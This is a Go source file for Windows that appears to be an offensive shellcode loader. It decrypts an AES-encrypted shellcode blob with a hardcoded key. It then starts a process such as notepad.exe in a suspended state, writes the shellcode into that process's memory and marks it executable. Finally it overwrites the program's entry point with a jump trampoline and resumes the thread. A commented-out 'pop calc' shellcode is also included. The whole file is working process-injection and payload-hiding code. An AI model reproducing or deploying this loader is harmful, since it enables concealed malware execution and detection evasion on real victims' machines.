// +build windows

package main

import (
	"encoding/binary"
	"flag"
	"fmt"
	"log"
	"os"
	"syscall"
	"unsafe"

	// Sub Repositories
	"github.com/Epictetus24/gohideit/enc"
	"golang.org/x/sys/windows"
)

func main() {
	verbose := flag.Bool("verbose", false, "Enable verbose output")
	debug := flag.Bool("debug", false, "Enable debug output")
	program := flag.String("program", "C:\\Windows\\System32\\notepad.exe", "The program to start and inject shellcode into")
	args := flag.String("args", "", "Program command line arguments")
	flag.Usage = func() {
		flag.PrintDefaults()
		os.Exit(0)
	}
	flag.Parse()

	/* Pop Calc Shellcode (x64)
	shellcode, errShellcode := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}
	*/
	var AESencbits enc.AESbits
	AESencbits.Enchex = "8391b221cebedddc99d218545c1791603c392b2fe8ed2ee73b603b5f8cc4d6b47ddca3c392b9944f0698d4312d14c33ef7048b54cf09f14f6e5d30ac4e0ee87d11a203e605f96a18482c99a591387c4b1f3823346f386162993c560763e94762993321aab9e79c0e112fed483094e98feeb5421b916f83f4c89bada699a6ebc16138a0930bbecfa624476111a9fd5916a6bef210b5f0abd72de2d7e07c7dff438c46532e456d37d99473f2bb6f9b82bb2c66a4bd0dcbb339fd91d8cd8aefe2b2049e5d7f61214cae21e27459374c2b28c89b86ee6b217d2a6066e888f1492c0254a80421332f6be645fd46a6a331f01b7282f44d7b97e5f62bc9f4ca4b28d68175167f12069df1b4d60dd44d66b1c89843ac37686adf008f20099a9258ff31b58f4da99339498a86e67366e5877907980eed765a382b385f767a3da625c0096ea1580e78d49adc088540c2f38aabebdfa40d15566604819f12fbbd97ff79c5bc42614f35de92eaa4a24fae1ca4359fafec6b976bd138612be3ce8b01ac8aeb68382a8b7bae9b4f715b473d6cce87845e70fbd0afd71ae6ee530e28d8c04849a8731a01519c6957ad4defcadea1fd60ccb893c0c4d72c54a72f27d0664908040a3fa97ed1ecfe52174a9fa8f8f201a8b2dd3323ca3f3a2fabb69b7a2e88fc7d89a251d9ad4d44b5f41f7daf56c82fedb3f635f14e6118ba4a9056167312489d28e0db213a33a67f0b4d0f93e1f4011a777af46ad6de0e4e6b8296d1a39f63f744a529f2899bbb9f5391578893c53c0f0679159d281989a1855422858325624e4cb9752a31f39dfccf3c35bdefec2d90165a21c4882c860fe963d793e62534738a0c2e95b9fd41ea22b567098d5eb004d95bf6deabd16b7d1a59206f9435e9ec9c7e32fb42ef57d46824adfbe8"
	AESencbits.Salthex = "46fbc4e4134ac40601a27d6fbbfe7ba6b57e6324aba4c3c390eadce0de59b81d"
	AESencbits.Noncehex = "9a008ddc522dbd4e401d9778"
	AESencbits.Keystr = "supersecret"

	shellcode := enc.AES256Dec(AESencbits)

	if *debug {
		fmt.Println("[DEBUG]Loading kernel32.dll and ntdll.dll...")
	}

	// Load DLLs and Procedures
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	if *debug {
		fmt.Println("[DEBUG]Loading supporting procedures...")
	}
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	NtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")

	// Create child proccess in suspended state
	/*
		BOOL CreateProcessW(
		LPCWSTR               lpApplicationName,
		LPWSTR                lpCommandLine,
		LPSECURITY_ATTRIBUTES lpProcessAttributes,
		LPSECURITY_ATTRIBUTES lpThreadAttributes,
		BOOL                  bInheritHandles,
		DWORD                 dwCreationFlags,
		LPVOID                lpEnvironment,
		LPCWSTR               lpCurrentDirectory,
		LPSTARTUPINFOW        lpStartupInfo,
		LPPROCESS_INFORMATION lpProcessInformation
		);
	*/

	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling CreateProcess to start:\r\n\t%s %s...", *program, *args))
	}
	procInfo := &windows.ProcessInformation{}
	startupInfo := &windows.StartupInfo{
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
		ShowWindow: 1,
	}
	errCreateProcess := windows.CreateProcess(syscall.StringToUTF16Ptr(*program), syscall.StringToUTF16Ptr(*args), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
	if errCreateProcess != nil && errCreateProcess.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling CreateProcess:\r\n%s", errCreateProcess.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully created the %s process in PID %d", *program, procInfo.ProcessId))
	}

	// Allocate memory in child process
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualAllocEx on PID %d...", procInfo.ProcessId))
	}
	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAllocEx failed and returned 0")
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully allocated memory in PID %d", procInfo.ProcessId))
	}
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Shellcode address: 0x%x", addr))
	}

	// Write shellcode into child process memory
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling WriteProcessMemory on PID %d...", procInfo.ProcessId))
	}
	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully wrote %d shellcode bytes to PID %d", len(shellcode), procInfo.ProcessId))
	}

	// Change memory permissions to RX in child process where shellcode was written
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualProtectEx on PID %d...", procInfo.ProcessId))
	}
	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully changed memory permissions to PAGE_EXECUTE_READ in PID %d", procInfo.ProcessId))
	}

	// Query the child process and find its image base address from its Process Environment Block (PEB)
	// https://github.com/winlabs/gowin32/blob/0b6f3bef0b7501b26caaecab8d52b09813224373/wrappers/winternl.go#L37
	// http://bytepointer.com/resources/tebpeb32.htm
	// https://www.nirsoft.net/kernel_struct/vista/PEB.html
	type PEB struct {
		//reserved1              [2]byte     // BYTE 0-1
		InheritedAddressSpace    byte    // BYTE	0
		ReadImageFileExecOptions byte    // BYTE	1
		BeingDebugged            byte    // BYTE	2
		reserved2                [1]byte // BYTE 3
		// ImageUsesLargePages          : 1;   //0x0003:0 (WS03_SP1+)
		// IsProtectedProcess           : 1;   //0x0003:1 (Vista+)
		// IsLegacyProcess              : 1;   //0x0003:2 (Vista+)
		// IsImageDynamicallyRelocated  : 1;   //0x0003:3 (Vista+)
		// SkipPatchingUser32Forwarders : 1;   //0x0003:4 (Vista_SP1+)
		// IsPackagedProcess            : 1;   //0x0003:5 (Win8_BETA+)
		// IsAppContainer               : 1;   //0x0003:6 (Win8_RTM+)
		// SpareBit                     : 1;   //0x0003:7
		//reserved3              [2]uintptr  // PVOID BYTE 4-8
		Mutant                 uintptr     // BYTE 4
		ImageBaseAddress       uintptr     // BYTE 8
		Ldr                    uintptr     // PPEB_LDR_DATA
		ProcessParameters      uintptr     // PRTL_USER_PROCESS_PARAMETERS
		reserved4              [3]uintptr  // PVOID
		AtlThunkSListPtr       uintptr     // PVOID
		reserved5              uintptr     // PVOID
		reserved6              uint32      // ULONG
		reserved7              uintptr     // PVOID
		reserved8              uint32      // ULONG
		AtlThunkSListPtr32     uint32      // ULONG
		reserved9              [45]uintptr // PVOID
		reserved10             [96]byte    // BYTE
		PostProcessInitRoutine uintptr     // PPS_POST_PROCESS_INIT_ROUTINE
		reserved11             [128]byte   // BYTE
		reserved12             [1]uintptr  // PVOID
		SessionId              uint32      // ULONG
	}

	// https://github.com/elastic/go-windows/blob/master/ntdll.go#L77
	type PROCESS_BASIC_INFORMATION struct {
		reserved1                    uintptr    // PVOID
		PebBaseAddress               uintptr    // PPEB
		reserved2                    [2]uintptr // PVOID
		UniqueProcessId              uintptr    // ULONG_PTR
		InheritedFromUniqueProcessID uintptr    // PVOID
	}

	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling NtQueryInformationProcess on %d...", procInfo.ProcessId))
	}

	var processInformation PROCESS_BASIC_INFORMATION
	var returnLength uintptr
	ntStatus, _, errNtQueryInformationProcess := NtQueryInformationProcess.Call(uintptr(procInfo.Process), 0, uintptr(unsafe.Pointer(&processInformation)), unsafe.Sizeof(processInformation), returnLength)
	if errNtQueryInformationProcess != nil && errNtQueryInformationProcess.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling NtQueryInformationProcess:\r\n\t%s", errNtQueryInformationProcess.Error()))
	}
	if ntStatus != 0 {
		if ntStatus == 3221225476 {
			log.Fatal("[!]Error calling NtQueryInformationProcess: STATUS_INFO_LENGTH_MISMATCH") // 0xc0000004 (3221225476)
		}
		fmt.Println(fmt.Sprintf("[!]NtQueryInformationProcess returned NTSTATUS: %x(%d)", ntStatus, ntStatus))
		log.Fatal(fmt.Sprintf("[!]Error calling NtQueryInformationProcess:\r\n\t%s", syscall.Errno(ntStatus)))
	}
	if *verbose {
		fmt.Println("[-]Got PEB info from NtQueryInformationProcess")
	}

	// Read from PEB base address to populate the PEB structure
	// ReadProcessMemory
	/*
		BOOL ReadProcessMemory(
		HANDLE  hProcess,
		LPCVOID lpBaseAddress,
		LPVOID  lpBuffer,
		SIZE_T  nSize,
		SIZE_T  *lpNumberOfBytesRead
		);
	*/

	ReadProcessMemory := kernel32.NewProc("ReadProcessMemory")

	if *debug {
		fmt.Println("[DEBUG]Calling ReadProcessMemory for PEB...")
	}

	var peb PEB
	var readBytes int32

	_, _, errReadProcessMemory := ReadProcessMemory.Call(uintptr(procInfo.Process), processInformation.PebBaseAddress, uintptr(unsafe.Pointer(&peb)), unsafe.Sizeof(peb), uintptr(unsafe.Pointer(&readBytes)))
	if errReadProcessMemory != nil && errReadProcessMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]ReadProcessMemory completed reading %d bytes for PEB", readBytes))
	}
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]PEB: %+v", peb))
		fmt.Println(fmt.Sprintf("[DEBUG]PEB ImageBaseAddress: 0x%x", peb.ImageBaseAddress))
	}

	// Read the child program's DOS header and validate it is a MZ executable
	type IMAGE_DOS_HEADER struct {
		Magic    uint16     // USHORT Magic number
		Cblp     uint16     // USHORT Bytes on last page of file
		Cp       uint16     // USHORT Pages in file
		Crlc     uint16     // USHORT Relocations
		Cparhdr  uint16     // USHORT Size of header in paragraphs
		MinAlloc uint16     // USHORT Minimum extra paragraphs needed
		MaxAlloc uint16     // USHORT Maximum extra paragraphs needed
		SS       uint16     // USHORT Initial (relative) SS value
		SP       uint16     // USHORT Initial SP value
		CSum     uint16     // USHORT Checksum
		IP       uint16     // USHORT Initial IP value
		CS       uint16     // USHORT Initial (relative) CS value
		LfaRlc   uint16     // USHORT File address of relocation table
		Ovno     uint16     // USHORT Overlay number
		Res      [4]uint16  // USHORT Reserved words
		OEMID    uint16     // USHORT OEM identifier (for e_oeminfo)
		OEMInfo  uint16     // USHORT OEM information; e_oemid specific
		Res2     [10]uint16 // USHORT Reserved words
		LfaNew   int32      // LONG File address of new exe header
	}

	if *debug {
		fmt.Println("[DEBUG]Calling ReadProcessMemory for IMAGE_DOS_HEADER...")
	}

	var dosHeader IMAGE_DOS_HEADER
	var readBytes2 int32

	_, _, errReadProcessMemory2 := ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress, uintptr(unsafe.Pointer(&dosHeader)), unsafe.Sizeof(dosHeader), uintptr(unsafe.Pointer(&readBytes2)))
	if errReadProcessMemory2 != nil && errReadProcessMemory2.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory2.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]ReadProcessMemory completed reading %d bytes for IMAGE_DOS_HEADER", readBytes2))
	}
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]IMAGE_DOS_HEADER: %+v", dosHeader))
		fmt.Println(fmt.Sprintf("[DEBUG]Magic: %s", string(dosHeader.Magic&0xff)+string(dosHeader.Magic>>8))) // LittleEndian
		fmt.Println(fmt.Sprintf("[DEBUG]PE header offset: 0x%x", dosHeader.LfaNew))
	}

	// 23117 is the LittleEndian unsigned base10 representation of MZ
	// 0x5a4d is the LittleEndian unsigned base16 represenation of MZ
	if dosHeader.Magic != 23117 {
		log.Fatal(fmt.Sprintf("[!]DOS image header magic string was not MZ"))
	}

	// Read the child process's PE header signature to validate it is a PE
	if *debug {
		fmt.Println("[DEBUG]Calling ReadProcessMemory for PE Signature...")
	}
	var Signature uint32
	var readBytes3 int32

	_, _, errReadProcessMemory3 := ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew), uintptr(unsafe.Pointer(&Signature)), unsafe.Sizeof(Signature), uintptr(unsafe.Pointer(&readBytes3)))
	if errReadProcessMemory3 != nil && errReadProcessMemory3.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory3.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]ReadProcessMemory completed reading %d bytes for PE Signature", readBytes3))

	}
	if *debug {
		fmt.Println(fmt.Sprintf("[DEUBG]PE Signature: 0x%x", Signature))
	}

	// 17744 is Little Endian Unsigned 32-bit integer in decimal for PE (null terminated)
	// 0x4550 is Little Endian Unsigned 32-bit integer in hex for PE (null terminated)
	if Signature != 17744 {
		log.Fatal("[!]PE Signature string was not PE")
	}

	// Read the child process's PE file header
	/*
		typedef struct _IMAGE_FILE_HEADER {
			USHORT  Machine;
			USHORT  NumberOfSections;
			ULONG   TimeDateStamp;
			ULONG   PointerToSymbolTable;
			ULONG   NumberOfSymbols;
			USHORT  SizeOfOptionalHeader;
			USHORT  Characteristics;
		} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;
	*/

	type IMAGE_FILE_HEADER struct {
		Machine              uint16
		NumberOfSections     uint16
		TimeDateStamp        uint32
		PointerToSymbolTable uint32
		NumberOfSymbols      uint32
		SizeOfOptionalHeader uint16
		Characteristics      uint16
	}

	if *debug {
		fmt.Println("[DEBUG]Calling ReadProcessMemory for IMAGE_FILE_HEADER...")
	}
	var peHeader IMAGE_FILE_HEADER
	var readBytes4 int32

	_, _, errReadProcessMemory4 := ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature), uintptr(unsafe.Pointer(&peHeader)), unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&readBytes4)))
	if errReadProcessMemory4 != nil && errReadProcessMemory4.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory4.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]ReadProcessMemory completed reading %d bytes for IMAGE_FILE_HEADER", readBytes4))
		switch peHeader.Machine {
		case 34404: // 0x8664
			fmt.Println("[-]Machine type: IMAGE_FILE_MACHINE_AMD64 (x64)")
		case 332: // 0x14c
			fmt.Println("[-]Machine type: IMAGE_FILE_MACHINE_I386 (x86)")
		default:
			fmt.Println(fmt.Sprintf("[-]Machine type UNKOWN: 0x%x", peHeader.Machine))
		}
	}
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]IMAGE_FILE_HEADER: %+v", peHeader))
		fmt.Println(fmt.Sprintf("[DEBUG]Machine: 0x%x", peHeader.Machine))
	}

	// Read the child process's PE optional header to find it's entry point
	/*
		https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header64
		typedef struct _IMAGE_OPTIONAL_HEADER64 {
		WORD                 Magic;
		BYTE                 MajorLinkerVersion;
		BYTE                 MinorLinkerVersion;
		DWORD                SizeOfCode;
		DWORD                SizeOfInitializedData;
		DWORD                SizeOfUninitializedData;
		DWORD                AddressOfEntryPoint;
		DWORD                BaseOfCode;
		ULONGLONG            ImageBase;
		DWORD                SectionAlignment;
		DWORD                FileAlignment;
		WORD                 MajorOperatingSystemVersion;
		WORD                 MinorOperatingSystemVersion;
		WORD                 MajorImageVersion;
		WORD                 MinorImageVersion;
		WORD                 MajorSubsystemVersion;
		WORD                 MinorSubsystemVersion;
		DWORD                Win32VersionValue;
		DWORD                SizeOfImage;
		DWORD                SizeOfHeaders;
		DWORD                CheckSum;
		WORD                 Subsystem;
		WORD                 DllCharacteristics;
		ULONGLONG            SizeOfStackReserve;
		ULONGLONG            SizeOfStackCommit;
		ULONGLONG            SizeOfHeapReserve;
		ULONGLONG            SizeOfHeapCommit;
		DWORD                LoaderFlags;
		DWORD                NumberOfRvaAndSizes;
		IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
		} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;
	*/

	type IMAGE_OPTIONAL_HEADER64 struct {
		Magic                       uint16
		MajorLinkerVersion          byte
		MinorLinkerVersion          byte
		SizeOfCode                  uint32
		SizeOfInitializedData       uint32
		SizeOfUninitializedData     uint32
		AddressOfEntryPoint         uint32
		BaseOfCode                  uint32
		ImageBase                   uint64
		SectionAlignment            uint32
		FileAlignment               uint32
		MajorOperatingSystemVersion uint16
		MinorOperatingSystemVersion uint16
		MajorImageVersion           uint16
		MinorImageVersion           uint16
		MajorSubsystemVersion       uint16
		MinorSubsystemVersion       uint16
		Win32VersionValue           uint32
		SizeOfImage                 uint32
		SizeOfHeaders               uint32
		CheckSum                    uint32
		Subsystem                   uint16
		DllCharacteristics          uint16
		SizeOfStackReserve          uint64
		SizeOfStackCommit           uint64
		SizeOfHeapReserve           uint64
		SizeOfHeapCommit            uint64
		LoaderFlags                 uint32
		NumberOfRvaAndSizes         uint32
		DataDirectory               uintptr
	}

	/*
		https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32
		typedef struct _IMAGE_OPTIONAL_HEADER {
		WORD                 Magic;
		BYTE                 MajorLinkerVersion;
		BYTE                 MinorLinkerVersion;
		DWORD                SizeOfCode;
		DWORD                SizeOfInitializedData;
		DWORD                SizeOfUninitializedData;
		DWORD                AddressOfEntryPoint;
		DWORD                BaseOfCode;
		DWORD                BaseOfData;
		DWORD                ImageBase;
		DWORD                SectionAlignment;
		DWORD                FileAlignment;
		WORD                 MajorOperatingSystemVersion;
		WORD                 MinorOperatingSystemVersion;
		WORD                 MajorImageVersion;
		WORD                 MinorImageVersion;
		WORD                 MajorSubsystemVersion;
		WORD                 MinorSubsystemVersion;
		DWORD                Win32VersionValue;
		DWORD                SizeOfImage;
		DWORD                SizeOfHeaders;
		DWORD                CheckSum;
		WORD                 Subsystem;
		WORD                 DllCharacteristics;
		DWORD                SizeOfStackReserve;
		DWORD                SizeOfStackCommit;
		DWORD                SizeOfHeapReserve;
		DWORD                SizeOfHeapCommit;
		DWORD                LoaderFlags;
		DWORD                NumberOfRvaAndSizes;
		IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
		} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;
	*/

	type IMAGE_OPTIONAL_HEADER32 struct {
		Magic                       uint16
		MajorLinkerVersion          byte
		MinorLinkerVersion          byte
		SizeOfCode                  uint32
		SizeOfInitializedData       uint32
		SizeOfUninitializedData     uint32
		AddressOfEntryPoint         uint32
		BaseOfCode                  uint32
		BaseOfData                  uint32 // Different from 64 bit header
		ImageBase                   uint64
		SectionAlignment            uint32
		FileAlignment               uint32
		MajorOperatingSystemVersion uint16
		MinorOperatingSystemVersion uint16
		MajorImageVersion           uint16
		MinorImageVersion           uint16
		MajorSubsystemVersion       uint16
		MinorSubsystemVersion       uint16
		Win32VersionValue           uint32
		SizeOfImage                 uint32
		SizeOfHeaders               uint32
		CheckSum                    uint32
		Subsystem                   uint16
		DllCharacteristics          uint16
		SizeOfStackReserve          uint64
		SizeOfStackCommit           uint64
		SizeOfHeapReserve           uint64
		SizeOfHeapCommit            uint64
		LoaderFlags                 uint32
		NumberOfRvaAndSizes         uint32
		DataDirectory               uintptr
	}

	if *debug {
		fmt.Println("[DEBUG]Calling ReadProcessMemory for IMAGE_OPTIONAL_HEADER...")
	}

	var optHeader64 IMAGE_OPTIONAL_HEADER64
	var optHeader32 IMAGE_OPTIONAL_HEADER32
	var errReadProcessMemory5 error
	var readBytes5 int32

	if peHeader.Machine == 34404 { // 0x8664
		_, _, errReadProcessMemory5 = ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader64)), unsafe.Sizeof(optHeader64), uintptr(unsafe.Pointer(&readBytes5)))
	} else if peHeader.Machine == 332 { // 0x14c
		_, _, errReadProcessMemory5 = ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader32)), unsafe.Sizeof(optHeader32), uintptr(unsafe.Pointer(&readBytes5)))
	} else {
		log.Fatal(fmt.Sprintf("[!]Unknow IMAGE_OPTIONAL_HEADER type for machine type: 0x%x", peHeader.Machine))
	}

	if errReadProcessMemory5 != nil && errReadProcessMemory5.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory5.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]ReadProcessMemory completed reading %d bytes for IMAGE_OPTIONAL_HEADER", readBytes5))
	}
	if *debug {
		if peHeader.Machine == 332 { // 0x14c
			fmt.Println(fmt.Sprintf("[DEBUG]IMAGE_OPTIONAL_HEADER32: %+v", optHeader32))
			fmt.Println(fmt.Sprintf("\t[DEBUG]ImageBase: 0x%x", optHeader32.ImageBase))
			fmt.Println(fmt.Sprintf("\t[DEBUG]AddressOfEntryPoint (relative): 0x%x", optHeader32.AddressOfEntryPoint))
			fmt.Println(fmt.Sprintf("\t[DEBUG]AddressOfEntryPoint (absolute): 0x%x", peb.ImageBaseAddress+uintptr(optHeader32.AddressOfEntryPoint)))
		}
		if peHeader.Machine == 34404 { // 0x8664
			fmt.Println(fmt.Sprintf("[DEBUG]IMAGE_OPTIONAL_HEADER64: %+v", optHeader64))
			fmt.Println(fmt.Sprintf("\t[DEBUG]ImageBase: 0x%x", optHeader64.ImageBase))
			fmt.Println(fmt.Sprintf("\t[DEBUG]AddressOfEntryPoint (relative): 0x%x", optHeader64.AddressOfEntryPoint))
			fmt.Println(fmt.Sprintf("\t[DEBUG]AddressOfEntryPoint (absolute): 0x%x", peb.ImageBaseAddress+uintptr(optHeader64.AddressOfEntryPoint)))
		}
	}

	// Overwrite the value at AddressofEntryPoint field with trampoline to load the shellcode address in RAX/EAX and jump to it
	var ep uintptr
	if peHeader.Machine == 34404 { // 0x8664 x64
		ep = peb.ImageBaseAddress + uintptr(optHeader64.AddressOfEntryPoint)
	} else if peHeader.Machine == 332 { // 0x14c x86
		ep = peb.ImageBaseAddress + uintptr(optHeader32.AddressOfEntryPoint)
	} else {
		log.Fatal(fmt.Sprintf("[!]Unknow IMAGE_OPTIONAL_HEADER type for machine type: 0x%x", peHeader.Machine))
	}

	var epBuffer []byte
	var shellcodeAddressBuffer []byte
	// x86 - 0xb8 = mov eax
	// x64 - 0x48 = rex (declare 64bit); 0xb8 = mov eax
	if peHeader.Machine == 34404 { // 0x8664 x64
		epBuffer = append(epBuffer, byte(0x48))
		epBuffer = append(epBuffer, byte(0xb8))
		shellcodeAddressBuffer = make([]byte, 8) // 8 bytes for 64-bit address
		binary.LittleEndian.PutUint64(shellcodeAddressBuffer, uint64(addr))
		epBuffer = append(epBuffer, shellcodeAddressBuffer...)
	} else if peHeader.Machine == 332 { // 0x14c x86
		epBuffer = append(epBuffer, byte(0xb8))
		shellcodeAddressBuffer = make([]byte, 4) // 4 bytes for 32-bit address
		binary.LittleEndian.PutUint32(shellcodeAddressBuffer, uint32(addr))
		epBuffer = append(epBuffer, shellcodeAddressBuffer...)
	} else {
		log.Fatal(fmt.Sprintf("[!]Unknow IMAGE_OPTIONAL_HEADER type for machine type: 0x%x", peHeader.Machine))
	}

	// 0xff ; 0xe0 = jmp [r|e]ax
	epBuffer = append(epBuffer, byte(0xff))
	epBuffer = append(epBuffer, byte(0xe0))

	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling WriteProcessMemory to overwrite AddressofEntryPoint at 0x%x with trampoline: 0x%x...", ep, epBuffer))
	}

	_, _, errWriteProcessMemory2 := WriteProcessMemory.Call(uintptr(procInfo.Process), ep, uintptr(unsafe.Pointer(&epBuffer[0])), uintptr(len(epBuffer)))

	if errWriteProcessMemory2 != nil && errWriteProcessMemory2.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory2.Error()))
	}
	if *verbose {
		fmt.Println("[-]Successfully overwrote the AddressofEntryPoint")
	}

	// Resume the child process
	if *debug {
		fmt.Println("[DEBUG]Calling ResumeThread...")
	}
	_, errResumeThread := windows.ResumeThread(procInfo.Thread)
	if errResumeThread != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling ResumeThread:\r\n%s", errResumeThread.Error()))
	}
	if *verbose {
		fmt.Println("[+]Process resumed and shellcode executed")
	}

	// Close the handle to the child process
	if *debug {
		fmt.Println("[DEBUG]Calling CloseHandle on child process...")
	}
	errCloseProcHandle := windows.CloseHandle(procInfo.Process)
	if errCloseProcHandle != nil {
		log.Fatal(fmt.Sprintf("[!]Error closing the child process handle:\r\n\t%s", errCloseProcHandle.Error()))
	}

	// Close the hand to the child process thread
	if *debug {
		fmt.Println("[DEBUG]Calling CloseHandle on child process thread...")
	}
	errCloseThreadHandle := windows.CloseHandle(procInfo.Thread)
	if errCloseThreadHandle != nil {
		log.Fatal(fmt.Sprintf("[!]Error closing the child process thread handle:\r\n\t%s", errCloseThreadHandle.Error()))
	}
}

// export GOOS=windows GOARCH=amd64;go build -o goCreateProcess.exe cmd/CreateProcess/main.go
// test STDERR go run .\cmd\CreateProcess\main.go -verbose -debug -program "C:\Windows\System32\cmd.exe" -args "/c whoami /asdfasdf"
